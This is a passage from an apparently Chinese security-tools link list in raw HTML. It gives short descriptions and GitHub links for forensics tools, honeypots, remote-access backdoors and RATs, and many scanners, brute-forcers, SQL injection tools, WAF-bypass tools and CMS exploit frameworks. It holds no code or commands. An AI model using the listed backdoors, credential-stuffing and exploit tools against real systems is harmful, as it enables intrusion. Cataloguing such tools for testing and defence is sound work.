href="https://github.com/Netflix/Scumblr" target="_blank" rel="noopener">https://github.com/Netflix/Scumblr</a></p><p>事件响应框架：</p><p><a href="https://github.com/google/grr" target="_blank" rel="noopener">https://github.com/google/grr</a></p><p>综合主机监控检测平台：</p><p><a href="https://github.com/ossec/ossec-hids" target="_blank" rel="noopener">https://github.com/ossec/ossec-hids</a></p><p>分布式实时数字取证系统：</p><p><a href="https://github.com/mozilla/mig" target="_blank" rel="noopener">https://github.com/mozilla/mig</a></p><p>Microsoft &amp; Unix 文件系统及硬盘取证工具：</p><p><a href="https://github.com/sleuthkit/sleuthkit" target="_blank" rel="noopener">https://github.com/sleuthkit/sleuthkit</a></p><h1 id="20-蜜罐"><a href="#20-蜜罐" class="headerlink" title="20.蜜罐"></a>20.蜜罐</h1><p>SSH蜜罐：</p><p><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a></p><p>蜜罐集合资源：</p><p><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p><p>kippo进阶版蜜罐：</p><p><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a></p><p>SMTP 蜜罐：</p><p><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a></p><p>web应用程序蜜罐：</p><p><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a></p><p>数据库蜜罐：</p><p><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a></p><p>web蜜罐：</p><p><a href="https://github.com/atiger77/Dionaea" target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p><h1 id="21-远控"><a href="#21-远控" class="headerlink" title="21.远控"></a>21.远控</h1><p>用gmail充当C&amp;C服务器的后门<br><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a></p><p>开源的远控：<br><a href="https://github.com/UbbeLoL/uRAT" target="_blank" rel="noopener">https://github.com/UbbeLoL/uRAT</a></p><p>c#远控：<br><a href="https://github.com/hussein-aitlahcen/BlackHole" target="_blank" rel="noopener">https://github.com/hussein-aitlahcen/BlackHole</a></p><h1 id="22-工具合集"><a href="#22-工具合集" class="headerlink" title="22.工具合集"></a>22.工具合集</h1><p>NoSQL扫描/爆破工具:</p><p><a href="https://github.com/torque59/Nosql-Exploitation-Framework" target="_blank" rel="noopener">https://github.com/torque59/Nosql-Exploitation-Framework</a></p><p>MySQL盲注爆破工具:</p><p><a href="https://github.com/missDronio/blindy" target="_blank" rel="noopener">https://github.com/missDronio/blindy</a></p><p>基于SQLMAP的主动和被动资源发现的漏洞扫描工具:</p><p><a href="https://github.com/fengxuangit/Fox-scan" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan</a></p><p>用于SQL Server审计的powershell脚本:</p><p><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></p><p>用于http header中的时间盲注爆破工具，仅针对MySQL / MariaDB:</p><p><a href="https://github.com/JohnTroony/Blisqy" target="_blank" rel="noopener">https://github.com/JohnTroony/Blisqy</a></p><p>Java编写的SQL注入工具:</p><p><a href="https://github.com/ron190/jsql-injection" target="_blank" rel="noopener">https://github.com/ron190/jsql-injection</a></p><p>基于搜索引擎的批量SQL注入漏洞扫描器:</p><p><a href="https://github.com/Hadesy2k/sqliv" target="_blank" rel="noopener">https://github.com/Hadesy2k/sqliv</a> </p><p>在sqlmap基础上增加了目录扫描，hash爆破等功能:</p><p><a href="https://github.com/s0md3v/sqlmate" target="_blank" rel="noopener">https://github.com/s0md3v/sqlmate</a></p><p>Mysys以及MSSQL爆破脱裤工具:</p><p><a href="https://github.com/m8r0wn/enumdb" target="_blank" rel="noopener">https://github.com/m8r0wn/enumdb</a></p><p>批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试:</p><p><a href="https://github.com/9tail123/wooscan" target="_blank" rel="noopener">https://github.com/9tail123/wooscan</a> </p><p>一个简单的HTTP暴力破解，撞库攻击脚本:</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><p>对各类服务进行弱口令检测的脚本:</p><p><a href="https://github.com/ysrc/F-Scrack" target="_blank" rel="noopener">https://github.com/ysrc/F-Scrack</a></p><p>根据用户习惯生成弱口令探测字典脚本:</p><p><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">https://github.com/Mebus/cupp</a></p><p>Go写的协程版的ssh \redis \ mongodb弱口令破解工具:</p><p><a href="https://github.com/netxfly/crack_ssh" target="_blank" rel="noopener">https://github.com/netxfly/crack_ssh</a></p><p>暴力破解字典建立工具:</p><p><a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a> </p><p>多线程探测弱口令:</p><p><a href="https://github.com/shengqi158/weak_password_detect" target="_blank" rel="noopener">https://github.com/shengqi158/weak_password_detect</a></p><p>支持测试CSRF，Clickjacking，Cloudflare和WAF的弱口令探测器:</p><p><a href="https://github.com/s0md3v/Blazy" target="_blank" rel="noopener">https://github.com/s0md3v/Blazy</a></p><p>对CiscoVPN，Citrix Gateway等各类服务进行弱口令检测的脚本:</p><p><a href="https://github.com/MooseDojo/myBFF" target="_blank" rel="noopener">https://github.com/MooseDojo/myBFF</a> </p><p>物联网设备默认密码扫描检测工具:</p><p><a href="https://github.com/rapid7/IoTSeeker" target="_blank" rel="noopener">https://github.com/rapid7/IoTSeeker</a></p><p>使用nmap扫描IoT设备:</p><p><a href="https://github.com/shodan-labs/iotdb" target="_blank" rel="noopener">https://github.com/shodan-labs/iotdb</a> </p><p>路由器设备漏洞扫描利用:</p><p><a href="https://github.com/googleinurl/RouterHunterBR" target="_blank" rel="noopener">https://github.com/googleinurl/RouterHunterBR</a></p><p>Telnet服务密码撞库:</p><p><a href="https://github.com/scu-igroup/telnet-scanner" target="_blank" rel="noopener">https://github.com/scu-igroup/telnet-scanner</a></p><p>自动化信息搜集及渗透测试工具，比较适用于IoT扫描:</p><p><a href="https://github.com/viraintel/OWASP-Nettacker" target="_blank" rel="noopener">https://github.com/viraintel/OWASP-Nettacker</a></p><p>嵌入式设备漏洞扫描及利用工具:</p><p><a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">https://github.com/threat9/routersploit</a></p><p>一款XSS扫描器，可暴力注入参数:</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p><p>小型XSS扫描器，也可检测CRLF，XSS，点击劫持的:</p><p><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> </p><p>PHP版本的反射型xss扫描:</p><p><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a></p><p>批量扫描XSS的python脚本:</p><p><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> </p><p>自动化检测页面是否存在XSS和跨站请求伪造漏洞的浏览器插件:</p><p><a href="https://github.com/BlackHole1/autoFindXssAndCsrf" target="_blank" rel="noopener">https://github.com/BlackHole1/autoFindXssAndCsrf</a></p><p>使用命令行进行XSS批量检测:</p><p><a href="https://github.com/shogunlab/shuriken" target="_blank" rel="noopener">https://github.com/shogunlab/shuriken</a></p><p>可识别和绕过WAF的XSS扫描工具:</p><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a> </p><p>支持GET，POST方式的高效XSS扫描器:</p><p><a href="https://github.com/stamparm/DSXS" target="_blank" rel="noopener">https://github.com/stamparm/DSXS</a> </p><p>网络资产识别引擎，漏洞检测引擎:</p><p><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a> </p><p>企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱，子域名，主持人:</p><p><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> </p><p>Bing，google，360，zoomeye 等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息:</p><p><a href="https://github.com/x0day/Multisearch-v2" target="_blank" rel="noopener">https://github.com/x0day/Multisearch-v2</a></p><p>能成抓取搜索引擎隐藏的url，并交由sqlmap，nmap扫描:</p><p><a href="https://github.com/Ekultek/Zeus-Scanner" target="_blank" rel="noopener">https://github.com/Ekultek/Zeus-Scanner</a></p><p>企业内网基础服务安全扫描框架:</p><p><a href="https://github.com/0xbug/Biu-framework" target="_blank" rel="noopener">https://github.com/0xbug/Biu-framework</a></p><p>github Repo信息搜集工具:</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><p>.svn文件夹泄漏利用工具:</p><p><a href="https://github.com/shengqi158/svnhack" target="_blank" rel="noopener">https://github.com/shengqi158/svnhack</a></p><p>GitHub敏感信息扫描工具:</p><p><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a></p><p>企业资产，敏感信息GitHub泄露监控系统:</p><p><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">https://github.com/0xbug/Hawkeye</a></p><p>根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具:</p><p><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="noopener">https://github.com/lianfeng30/githubscan</a></p><p>github敏感信息搜索工具:</p><p><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a></p><p> .git文件夹泄漏利用工具:</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>GitHub敏感信息扫描工具，包括检测提交等:</p><p><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a></p><p>自动化对指定域名进行Google hacking搜索并收集信息:</p><p><a href="https://github.com/1N3/Goohak" target="_blank" rel="noopener">https://github.com/1N3/Goohak</a></p><p>用于搜索git的承诺中的敏感信息，例如密码，私钥等的客户端工具:</p><p><a href="https://github.com/UKHomeOffice/repo-security-scanner" target="_blank" rel="noopener">https://github.com/UKHomeOffice/repo-security-scanner</a></p><p>Github敏感信息泄露扫描:</p><p><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p><p>Github泄露巡航工具:</p><p><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a></p><p>Web站点信息搜集工具，包括邮箱，电话等信息:</p><p><a href="https://github.com/1N3/BlackWidow" target="_blank" rel="noopener">https://github.com/1N3/BlackWidow</a></p><p>集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具:</p><p><a href="https://github.com/anshumanbh/git-all-secrets" target="_blank" rel="noopener">https://github.com/anshumanbh/git-all-secrets</a> </p><p>可以提取网址，电子邮件，文件，网站帐户等的高速爬虫:</p><p><a href="https://github.com/s0md3v/Photon" target="_blank" rel="noopener">https://github.com/s0md3v/Photon</a></p><p>一款简单的webshell检测工具:</p><p><a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a></p><p>哈勃分析系统，LINUX系统病毒分析及安全检测:</p><p><a href="https://github.com/Tencent/HaboMalHunter" target="_blank" rel="noopener">https://github.com/Tencent/HaboMalHunter</a></p><p>使用python实现的集成ClamAV，ESET，Bitdefender的反病毒引擎:</p><p><a href="https://github.com/PlagueScanner/PlagueScanner" target="_blank" rel="noopener">https://github.com/PlagueScanner/PlagueScanner</a></p><p>一款高效率PHP-webshell扫描工具:</p><p><a href="https://github.com/nbs-system/php-malware-finder" target="_blank" rel="noopener">https://github.com/nbs-system/php-malware-finder</a> </p><p>测试效率高达99%的webshell检测工具:</p><p><a href="https://github.com/emposha/PHP-Shell-Detector/" target="_blank" rel="noopener">https://github.com/emposha/PHP-Shell-Detector/</a></p><p>一款简洁的的Webshell扫描工具:</p><p><a href="https://github.com/erevus-cn/scan_webshell" target="_blank" rel="noopener">https://github.com/erevus-cn/scan_webshell</a></p><p>Webshell扫描工具，支持php / perl / asp / aspx webshell扫描:</p><p><a href="https://github.com/emposha/Shell-Detector" target="_blank" rel="noopener">https://github.com/emposha/Shell-Detector</a></p><p>一款木马，僵尸网络分析框架:</p><p><a href="https://github.com/m4rco-/dorothy2" target="_blank" rel="noopener">https://github.com/m4rco-/dorothy2</a> </p><p>高级安卓木马病毒分析框架:</p><p><a href="https://github.com/droidefense/engine" target="_blank" rel="noopener">https://github.com/droidefense/engine</a></p><p>基于网络流量的内网探测框架:</p><p><a href="https://github.com/lcatro/network_backdoor_scanner" target="_blank" rel="noopener">https://github.com/lcatro/network_backdoor_scanner</a></p><p>调用Windows API枚举用户登录信息:</p><p><a href="https://github.com/fdiskyou/hunter" target="_blank" rel="noopener">https://github.com/fdiskyou/hunter</a> </p><p>自动化利用XSS入侵内网:</p><p><a href="https://github.com/BlackHole1/WebRtcXSS" target="_blank" rel="noopener">https://github.com/BlackHole1/WebRtcXSS</a></p><p>目标端口扫描+系统服务指纹识别:</p><p><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">https://github.com/ring04h/wyportmap</a> </p><p>动态多线程敏感信息泄露检测工具:</p><p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a></p><p>WAF产品指纹识别:</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><p>SSL类型识别:</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p><p>Web指纹识别:</p><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p><p>Web应用指纹识别:</p><p><a href="https://github.com/tanjiti/FingerPrint" target="_blank" rel="noopener">https://github.com/tanjiti/FingerPrint</a></p><p>网络爬虫式指纹识别:</p><p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p><p>基于Masscan和Zmap的网络扫描器:</p><p><a href="https://github.com/OffensivePython/Nscan" target="_blank" rel="noopener">https://github.com/OffensivePython/Nscan</a> </p><p>网络资产信息扫描，ICMP存活探测，端口扫描，端口指纹服务识别:</p><p><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a> </p><p>中间件扫描:</p><p><a href="https://github.com/ywolf/F-MiddlewareScan" target="_blank" rel="noopener">https://github.com/ywolf/F-MiddlewareScan</a></p><p>web路径收集与扫描:</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>C段横幅与路径扫描:</p><p><a href="https://github.com/x0day/bannerscan" target="_blank" rel="noopener">https://github.com/x0day/bannerscan</a></p><p>端口服务扫描:</p><p><a href="https://github.com/RASSec/RASscan" target="_blank" rel="noopener">https://github.com/RASSec/RASscan</a> </p><p>waf自动暴破:</p><p><a href="https://github.com/3xp10it/bypass_waf" target="_blank" rel="noopener">https://github.com/3xp10it/bypass_waf</a></p><p>尝试找出cdn背后的真实ip:</p><p><a href="https://github.com/3xp10it/xcdn" target="_blank" rel="noopener">https://github.com/3xp10it/xcdn</a> </p><p>基于Bing搜索引擎的C段/旁站查询，多线程，支持API:</p><p><a href="https://github.com/Xyntax/BingC" target="_blank" rel="noopener">https://github.com/Xyntax/BingC</a> </p><p>多线程WEB目录爆破工具:</p><p><a href="https://github.com/Xyntax/DirBrute" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute</a> </p><p>一个爬虫式的网段Web主机发现小工具:</p><p><a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a></p><p>Thorn上实现的分布式任务分发的ip端口漏洞扫描器:</p><p><a href="https://github.com/lietdai/doom" target="_blank" rel="noopener">https://github.com/lietdai/doom</a></p><p>类似zgrab的快速TCP指纹抓取解析工具，支持更多协议:</p><p><a href="https://github.com/chichou/grab.js" target="_blank" rel="noopener">https://github.com/chichou/grab.js</a></p><p>CDN识别，检测:</p><p><a href="https://github.com/Nitr4x/whichCDN" target="_blank" rel="noopener">https://github.com/Nitr4x/whichCDN</a></p><p>基于爬虫的web路径扫描器:</p><p><a href="https://github.com/secfree/bcrpscan" target="_blank" rel="noopener">https://github.com/secfree/bcrpscan</a></p><p>服务器ssh配置信息扫描:</p><p><a href="https://github.com/mozilla/ssh_scan" target="_blank" rel="noopener">https://github.com/mozilla/ssh_scan</a></p><p>针对域名及其子域名的资产数据检测/扫描，包括http / https检测等:</p><p><a href="https://github.com/18F/domain-scan" target="_blank" rel="noopener">https://github.com/18F/domain-scan</a> </p><p>域名资产收集及指纹识别工具:</p><p><a href="https://github.com/ggusoft/inforfinder" target="_blank" rel="noopener">https://github.com/ggusoft/inforfinder</a></p><p>CMS识别python gevent实现:</p><p><a href="https://github.com/boy-hack/gwhatweb" target="_blank" rel="noopener">https://github.com/boy-hack/gwhatweb</a></p><p>敏感文件扫描/二次判断降低误报率/扫描内容规则化/多目录扫描:</p><p><a href="https://github.com/Mosuan/FileScan" target="_blank" rel="noopener">https://github.com/Mosuan/FileScan</a></p><p>基于爬虫的动态敏感文件探测工具:</p><p><a href="https://github.com/Xyntax/FileSensor" target="_blank" rel="noopener">https://github.com/Xyntax/FileSensor</a></p><p>web路径扫描工具:</p><p><a href="https://github.com/deibit/cansina" target="_blank" rel="noopener">https://github.com/deibit/cansina</a></p><p>网络设备web服务指纹扫描与检索:</p><p><a href="https://github.com/0xbug/Howl" target="_blank" rel="noopener">https://github.com/0xbug/Howl</a> </p><p>目标主机服务ssl类型识别:</p><p><a href="https://github.com/mozilla/cipherscan" target="_blank" rel="noopener">https://github.com/mozilla/cipherscan</a></p><p>Web应用fuzz工具，框架，同时可用于web路径/服务扫描:</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>多线程的后台路径扫描器，也可用于发现重定向漏洞后执行:</p><p><a href="https://github.com/s0md3v/Breacher" target="_blank" rel="noopener">https://github.com/s0md3v/Breacher</a></p><p>弱口令扫描器，不仅支持普通登录页，也支持ssh，mongodb等组件:</p><p><a href="https://github.com/ztgrace/changeme" target="_blank" rel="noopener">https://github.com/ztgrace/changeme</a> </p><p>渗透测试辅助工具，支持分析数据包，解码，端口扫描，IP地址分析等:</p><p><a href="https://github.com/medbenali/CyberScan" target="_blank" rel="noopener">https://github.com/medbenali/CyberScan</a></p><p>基于nmap的扫描器，与cve漏洞关联:</p><p><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a> </p><p>基于nmap的高级漏洞扫描器，命令行环境使用:</p><p><a href="https://github.com/scipag/vulscan" target="_blank" rel="noopener">https://github.com/scipag/vulscan</a> </p><p>web应用信息搜集工具:</p><p><a href="https://github.com/jekyc/wig" target="_blank" rel="noopener">https://github.com/jekyc/wig</a></p><p>围绕web服务的域名进行信息收集和“域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等:</p><p><a href="https://github.com/eldraco/domain_analyzer" target="_blank" rel="noopener">https://github.com/eldraco/domain_analyzer</a> </p><p>基于Nikto扫描规则的被动式路径扫描以及信息爬虫:</p><p><a href="https://github.com/cloudtracer/paskto" target="_blank" rel="noopener">https://github.com/cloudtracer/paskto</a> </p><p>快速识别WEB服务器类型，CMS类型，WAF类型，WHOIS信息，以及语言框架:</p><p><a href="https://github.com/zerokeeper/WebEye" target="_blank" rel="noopener">https://github.com/zerokeeper/WebEye</a></p><p>用于检查web服务的http header的安全性:</p><p><a href="https://github.com/m3liot/shcheck" target="_blank" rel="noopener">https://github.com/m3liot/shcheck</a></p><p>一款高效快捷的敏感文件扫描工具:</p><p><a href="https://github.com/aipengjie/sensitivefilescan" target="_blank" rel="noopener">https://github.com/aipengjie/sensitivefilescan</a></p><p>通过字典穷举，google，robots.txt等途径的跨平台后台管理路径扫描器:</p><p><a href="https://github.com/fnk0c/cangibrina" target="_blank" rel="noopener">https://github.com/fnk0c/cangibrina</a></p><p>常规CMS指纹识别:</p><p><a href="https://github.com/n4xh4ck5/CMSsc4n" target="_blank" rel="noopener">https://github.com/n4xh4ck5/CMSsc4n</a></p><p>WAF指纹识别及自动化绕过工具:</p><p><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a></p><p>网络应用模糊工具，框架，同时可用于网络路径/服务扫描:</p><p><a href="https://github.com/dzonerzy/goWAPT" target="_blank" rel="noopener">https://github.com/dzonerzy/goWAPT</a></p><p>web敏感目录/信息泄漏扫描脚本:</p><p><a href="https://github.com/blackye/webdirdig" target="_blank" rel="noopener">https://github.com/blackye/webdirdig</a></p><p>用于网站或IP地址的信息收集工具:</p><p><a href="https://github.com/GitHackTools/BillCipher" target="_blank" rel="noopener">https://github.com/GitHackTools/BillCipher</a> </p><p>通过扫描全网获得真实IP的自动化程序:</p><p><a href="https://github.com/boy-hack/w8fuckcdn" target="_blank" rel="noopener">https://github.com/boy-hack/w8fuckcdn</a></p><p>分布式WEB指纹识别平台:</p><p><a href="https://github.com/boy-hack/w11scan" target="_blank" rel="noopener">https://github.com/boy-hack/w11scan</a> </p><p>爬虫式web目录扫描工具:</p><p><a href="https://github.com/Nekmo/dirhunt" target="_blank" rel="noopener">https://github.com/Nekmo/dirhunt</a> </p><p>Jenkins漏洞探测，用户抓取爆破:</p><p><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a></p><p>首款集成化的Discuz扫描工具:</p><p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a> </p><p>一款简洁优雅的CMS扫描利用框架:</p><p><a href="https://github.com/chuhades/CMS-Exploit-Framework" target="_blank" rel="noopener">https://github.com/chuhades/CMS-Exploit-Framework</a> </p><p>IIS短文件名暴力枚举漏洞利用工具:</p><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a></p><p>flashxss扫描:</p><p><a href="https://github.com/riusksk/FlashScanner" target="_blank" rel="noopener">https://github.com/riusksk/FlashScanner</a></p><p>一个起毛服务器端模板注入漏洞的半自动化工具:</p><p><a href="https://github.com/coffeehb/SSTIF" target="_blank" rel="noopener">https://github.com/coffeehb/SSTIF</a></p><p>服务器端模板注入漏洞检测与利用工具:</p><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a> </p><p>扫描工具:</p><p><a href="https://github.com/cr0hn/dockerscanDocker" target="_blank" rel="noopener">https://github.com/cr0hn/dockerscanDocker</a></p><p>一款精简的wordpress扫描工具:</p><p><a href="https://github.com/m4ll0k/WPSeku" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSeku</a> </p><p>集成化wordpress漏洞利用框架:</p><p><a href="https://github.com/rastating/wordpress-exploit-framework" target="_blank" rel="noopener">https://github.com/rastating/wordpress-exploit-framework</a> </p><p>用于扫描J2EE应用的一款burpsuite插件:</p><p><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p><p>一款基于perl的strut2的历史漏洞扫描器:</p><p><a href="https://github.com/riusksk/StrutScan" target="_blank" rel="noopener">https://github.com/riusksk/StrutScan</a> </p><p>本地文件包含漏洞利用及扫描工具，支持反弹shell:</p><p><a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="noopener">https://github.com/D35m0nd142/LFISuite</a></p><p>基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA，slack平台结合使用:</p><p><a href="https://github.com/0x4D31/salt-scanner" target="_blank" rel="noopener">https://github.com/0x4D31/salt-scanner</a> </p><p>自动化探测客户端AngularJS模板注入漏洞工具:</p><p><a href="https://github.com/tijme/angularjs-csti-scanner" target="_blank" rel="noopener">https://github.com/tijme/angularjs-csti-scanner</a></p><p>Java编写的IIS短文件名暴力枚举漏洞利用工具:</p><p><a href="https://github.com/irsdl/IIS-ShortName-Scanner" target="_blank" rel="noopener">https://github.com/irsdl/IIS-ShortName-Scanner</a></p><p>基于WPScan以及WPSeku的优化版wordpress扫描器:</p><p><a href="https://github.com/swisskyrepo/Wordpresscan" target="_blank" rel="noopener">https://github.com/swisskyrepo/Wordpresscan</a></p><p>CMS渗透测试框架:</p><p><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="noopener">https://github.com/CHYbeta/cmsPoc</a></p><p>CRLF注入漏洞批量扫描:</p><p><a href="https://github.com/rudSarkar/crlf-injector" target="_blank" rel="noopener">https://github.com/rudSarkar/crlf-injector</a></p><p>自动化扫描内网中存在的由影子经纪人泄露的ETERNAL系列漏洞:</p><p><a href="https://github.com/3gstudent/Smbtouch-Scanner" target="_blank" rel="noopener">https://github.com/3gstudent/Smbtouch-Scanner</a></p><p>通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描:</p><p><a href="https://github.com/utiso/dorkbot" target="_blank" rel="noopener">https://github.com/utiso/dorkbot</a> </p><p>本地文件包含漏洞利用及扫描工具，支持反弹shell:</p><p><a href="https://github.com/OsandaMalith/LFiFreak" target="_blank" rel="noopener">https://github.com/OsandaMalith/LFiFreak</a></p><p>用于枚举脚本的GET / POST未知参数字段:</p><p><a href="https://github.com/mak-/parameth" target="_blank" rel="noopener">https://github.com/mak-/parameth</a> </p><p>struts2的漏洞全版本检测和利用工具:</p><p><a href="https://github.com/Lucifer1993/struts-scan" target="_blank" rel="noopener">https://github.com/Lucifer1993/struts-scan</a></p><p>SSL漏洞扫描，例如心脏滴血漏洞等:</p><p><a href="https://github.com/hahwul/a2sv" target="_blank" rel="noopener">https://github.com/hahwul/a2sv</a></p><p>基于搜索引擎的漏洞网页搜寻:</p><p><a href="https://github.com/NullArray/DorkNet" target="_blank" rel="noopener">https://github.com/NullArray/DorkNet</a></p><p>用于攻击爆破Java RemoteMethod Invocation服务的工具:</p><p><a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">https://github.com/NickstaDB/BaRMIe</a></p><p>扫描js扩展库的常见漏洞:</p><p><a href="https://github.com/RetireJS/grunt-retire" target="_blank" rel="noopener">https://github.com/RetireJS/grunt-retire</a></p><p>针对的hadoop /火花等大数据平台的的漏洞探测工具:</p><p><a href="https://github.com/kotobukki/BDA" target="_blank" rel="noopener">https://github.com/kotobukki/BDA</a></p><p>RegEx拒绝服务扫描器:</p><p><a href="https://github.com/jagracey/Regex-DoS" target="_blank" rel="noopener">https://github.com/jagracey/Regex-DoS</a></p><p>使用NMAP扫描的Tor网络上隐藏的“洋葱”服务:</p><p><a href="https://github.com/milesrichardson/docker-onion-nmap" target="_blank" rel="noopener">https://github.com/milesrichardson/docker-onion-nmap</a></p><p>Web CMS Exploit工具，包含针对主流CMS的66个不同的漏洞利用:</p><p><a href="https://github.com/Moham3dRiahi/XAttacker" target="_blank" rel="noopener">https://github.com/Moham3dRiahi/XAttacker</a></p><p>一个迷你的信息泄漏批量扫描脚本:</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>文件上传漏洞扫描器及利用工具:</p><p><a href="https://github.com/almandin/fuxploider" target="_blank" rel="noopener">https://github.com/almandin/fuxploider</a> </p><p>子域名接管漏洞检测工具，支持30+云服务托管检测:</p><p><a href="https://github.com/Ice3man543/SubOver" target="_blank" rel="noopener">https://github.com/Ice3man543/SubOver</a> </p><p>WordPress的漏洞扫描器，同时也支持敏感文件泄露扫描:</p><p><a href="https://github.com/Jamalc0m/wphunter" target="_blank" rel="noopener">https://github.com/Jamalc0m/wphunter</a></p><p>检测网站依赖的JavaScript库中存在的已知通用漏洞:</p><p><a href="https://github.com/retirejs/retire.js" target="_blank" rel="noopener">https://github.com/retirejs/retire.js</a></p><p>自动检测上传功能是否可上传webshell:</p><p><a href="https://github.com/3xp10it/xupload" target="_blank" rel="noopener">https://github.com/3xp10it/xupload</a> </p><p>CMS指纹识别及自动化渗透测试框架:</p><p><a href="https://github.com/mobrine-mob/M0B-tool" target="_blank" rel="noopener">https://github.com/mobrine-mob/M0B-tool</a></p><p>论坛框架vBulletin黑盒漏洞扫描器:</p><p><a href="https://github.com/rezasp/vbscan" target="_blank" rel="noopener">https://github.com/rezasp/vbscan</a> </p><p>CMS指纹识别及自动化渗透测试框架:</p><p><a href="https://github.com/MrSqar-Ye/BadMod" target="_blank" rel="noopener">https://github.com/MrSqar-Ye/BadMod</a></p><p>CMS漏洞检测和利用套件:</p><p><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/CMSeeK</a></p><p>AWS安全审计工具:</p><p><a href="https://github.com/cloudsploit/scans" target="_blank" rel="noopener">https://github.com/cloudsploit/scans</a></p><p>针对wp，magento，joomla等CMS的漏洞扫描器及自动利用工具:</p><p><a href="https://github.com/radenvodka/SVScanner" target="_blank" rel="noopener">https://github.com/radenvodka/SVScanner</a> </p><p>OWASP旗下joomla漏洞扫描项目:</p><p><a href="https://github.com/rezasp/joomscan" target="_blank" 